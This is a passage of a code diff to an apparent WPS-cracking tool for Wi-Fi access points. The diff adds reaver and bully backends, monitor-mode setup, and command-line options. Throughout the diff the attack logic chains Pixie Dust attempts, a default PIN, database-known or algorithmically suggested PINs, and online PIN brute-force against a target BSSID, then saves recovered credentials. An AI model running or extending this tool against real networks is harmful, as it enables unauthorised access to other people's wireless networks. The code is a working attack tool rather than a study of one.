+                    continue
+                print(f"\n=== Attacking {net['BSSID']} "
+                      f"({net.get('ESSID', 'HIDDEN')}) "
+                      f"[{backend}] ===")
+                ch = net.get('Channel', 0)
+                try:
+                    if net['Pixie vulnerable']:
+                        result = attacker.pixie_dust(net['BSSID'], channel=ch)
+                        if not result.success:
+                            print('[i] Pixie Dust failed — trying PIN attack')
+                            result = attacker.single_pin(
+                                net['BSSID'], '12345670', channel=ch)
+                    else:
+                        result = attacker.bruteforce(
+                            net['BSSID'], channel=ch)
+                    _handle_backend_result(
+                        result, net['BSSID'], db=db,
+                        save_result=args.write, reports_dir=reports_dir,
+                        json_mode=args.json)
+                except KeyboardInterrupt:
+                    print('\n[!] Interrupted.')
+                    break
+        finally:
+            print(f'[*] Restoring {interface} to managed mode…')
+            teardown_monitor_mode(mon_iface, interface)
+        return
+
+    # ------- Internal backend (wpa_supplicant) -----------------------------
     for net in order:
         if net['WPS locked']:
             print(f"[i] Skipping {net['BSSID']} (WPS locked)")
@@ -1497,6 +2459,8 @@ Required arguments:
 Optional arguments:
     -b, --bssid=<mac>         BSSID of the target AP
     -p, --pin=<wps pin>       Use the specified pin (arbitrary string or 4/8 digit pin)
+    -c, --channel=<n>         Channel of the target AP (useful for reaver/bully)
+    -e, --backend=<engine>    Attack backend: internal, reaver, bully (default: internal)
     -K, --pixie-dust          Run Pixie Dust attack
     -B, --bruteforce          Run online bruteforce attack
     --push-button-connect     Run WPS push button connection
@@ -1521,7 +2485,7 @@ Persistence & output:
     --oui=<path>              Additional OUI vendor file (prefix<tab>vendor)
 
 Safety & timing:
-    --timeout=<sec>           pixiewps timeout (default 120)
+    --timeout=<sec>           pixiewps/backend timeout (default 120)
     --cool=<sec>              Cool-down after 3 NACKs (default 60)
     --no-lockout-check        Skip lockout safety (not recommended)
     --pixie-only              In --auto mode, only attack Pixie-vulnerable targets
@@ -1541,6 +2505,11 @@ if __name__ == '__main__':
     parser.add_argument('-b', '--bssid', help='BSSID of the target AP')
     parser.add_argument('-p', '--pin',
                         help='Use the specified pin (arbitrary string or 4/8 digit pin)')
+    parser.add_argument('-c', '--channel', type=int, default=None,
+                        help='Channel of the target AP (useful for reaver/bully)')
+    parser.add_argument('-e', '--backend', choices=['internal', 'reaver', 'bully'],
+                        default='internal',
+                        help='Attack backend engine: internal (wpa_supplicant), reaver, bully (default: internal)')
     parser.add_argument('-K', '--pixie-dust', action='store_true',
                         help='Run Pixie Dust attack')
     parser.add_argument('-F', '--pixie-force', action='store_true',
@@ -1624,17 +2593,20 @@ if __name__ == '__main__':
 
         while True:
             try:
-                comp = Companion(
-                    args.interface, args.write,
-                    print_debug=args.verbose, db=db,
-                    json_mode=args.json, trace_log=args.trace_log,
-                    pixiewps_timeout=args.timeout, cool_down=args.cool)
-
                 selected_vuln = False
                 selected_chipset = ''
+                selected_channel = args.channel
 
-                if args.pbc:
-                    comp.single_connection(pbc_mode=True)
+                if args.pbc and args.backend == 'internal':
+                    comp = Companion(
+                        args.interface, args.write,
+                        print_debug=args.verbose, db=db,
+                        json_mode=args.json, trace_log=args.trace_log,
+                        pixiewps_timeout=args.timeout, cool_down=args.cool)
+                    try:
+                        comp.single_connection(pbc_mode=True)
+                    finally:
+                        comp.cleanup()
                 else:
                     if not args.bssid:
                         try:
@@ -1652,20 +2624,104 @@ if __name__ == '__main__':
                         args.bssid = scanner.prompt_network()
                         selected_vuln = scanner.selected_vuln
                         selected_chipset = scanner.selected_chipset
+                        if not selected_channel:
+                            selected_channel = scanner.selected_channel
 
-                    if args.bssid:
-                        comp.target_is_pixie_vuln = selected_vuln
-                        comp.target_chipset = selected_chipset
-                        if args.bruteforce:
-                            comp.smart_bruteforce(
-                                args.bssid, args.pin, args.delay,
-                                loop=args.loop)
-                        else:
-                            comp.single_connection(
-                                args.bssid, args.pin, args.pixie_dust,
-                                args.pbc, args.show_pixie_cmd,
-                                args.pixie_force)
-                comp.cleanup()
+                    if not args.bssid:
+                        if not args.loop:
+                            break
+                        continue
+
+                    reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+
+                    # ------- External backends (reaver / bully) ------------
+                    if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
+                        attacker_cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
+                        if not attacker_cls.is_available():
+                            die(f'{args.backend} is not installed or not in PATH')
+
+                        print(f'[*] Switching {args.interface} to monitor mode…')
+                        mon_iface = setup_monitor_mode(args.interface)
+                        print(f'[+] Monitor interface: {mon_iface}')
+                        try:
+                            attacker = attacker_cls(
+                                mon_iface, verbose=args.verbose,
+                                timeout=args.timeout, delay=args.delay,
+                                json_mode=args.json)
+
+                            pixiemode = args.pixie_dust
+                            pin = args.pin
+
+                            # Offer Pixie Dust first if vulnerable
+                            if not pin and not args.bruteforce and not pixiemode and selected_vuln:
+                                chipset = selected_chipset or 'unknown chipset'
+                                print(f'[!] Target {args.bssid} looks Pixie Dust vulnerable ({chipset}).')
+                                ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
+                                if ans != 'n':
+                                    pixiemode = True
+
+                            # If not pixie and no pin and not bruteforce, suggest known/algorithmic PINs
+                            if not pin and not args.bruteforce and not pixiemode:
+                                known = db.known_pin(args.bssid)
+                                if known:
+                                    print(f'[i] Known PIN in DB for {args.bssid}: {known}')
+                                    pin = known
+                                else:
+                                    generator = WPSpin()
+                                    pins = generator.getSuggestedUnique(args.bssid)
+                                    if len(pins) > 1:
+                                        print(f'Suggested PINs for {args.bssid}:')
+                                        print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+                                        for i, p in enumerate(pins):
+                                            print('{:<3} {:<10} {:<}'.format(
+                                                f'{i + 1})', p['pin'], p['name']))
+                                        choice = input('Select PIN (or Enter for Pixie Dust / Brute-force): ').strip()
+                                        if choice.isdigit() and 1 <= int(choice) <= len(pins):
+                                            pin = pins[int(choice) - 1]['pin']
+                                    elif len(pins) == 1:
+                                        pin = pins[0]['pin']
+
+                            if pixiemode or (not pin and not args.bruteforce):
+                                res = attacker.pixie_dust(args.bssid, channel=selected_channel)
+                                if not res.success and not pin and not args.bruteforce:
+                                    print(f'[-] Pixie Dust attack failed with {args.backend}')
+                                    if input('[?] Fall back to online brute-force? [y/N] ').strip().lower() == 'y':
+                                        res = attacker.bruteforce(
+                                            args.bssid, channel=selected_channel, start_pin=args.pin)
+                            elif pin:
+                                res = attacker.single_pin(args.bssid, pin, channel=selected_channel)
+                            elif args.bruteforce:
+                                res = attacker.bruteforce(
+                                    args.bssid, channel=selected_channel, start_pin=args.pin)
+
+                            _handle_backend_result(
+                                res, args.bssid, db=db, save_result=args.write,
+                                reports_dir=reports_dir, json_mode=args.json)
+                        finally:
+                            print(f'[*] Restoring {args.interface} to managed mode…')
+                            teardown_monitor_mode(mon_iface, args.interface)
+
+                    # ------- Internal backend (wpa_supplicant) -------------
+                    else:
+                        comp = Companion(
+                            args.interface, args.write,
+                            print_debug=args.verbose, db=db,
+                            json_mode=args.json, trace_log=args.trace_log,
+                            pixiewps_timeout=args.timeout, cool_down=args.cool)
+                        try:
+                            comp.target_is_pixie_vuln = selected_vuln
+                            comp.target_chipset = selected_chipset
+                            if args.bruteforce:
+                                comp.smart_bruteforce(
+                                    args.bssid, args.pin, args.delay,
+                                    loop=args.loop)
+                            else:
+                                comp.single_connection(
+                                    args.bssid, args.pin, args.pixie_dust,
+                                    args.pbc, args.show_pixie_cmd,
+                                    args.pixie_force)
+                        finally:
+                            comp.cleanup()
                 if not args.loop:
                     break
                 args.bssid = None
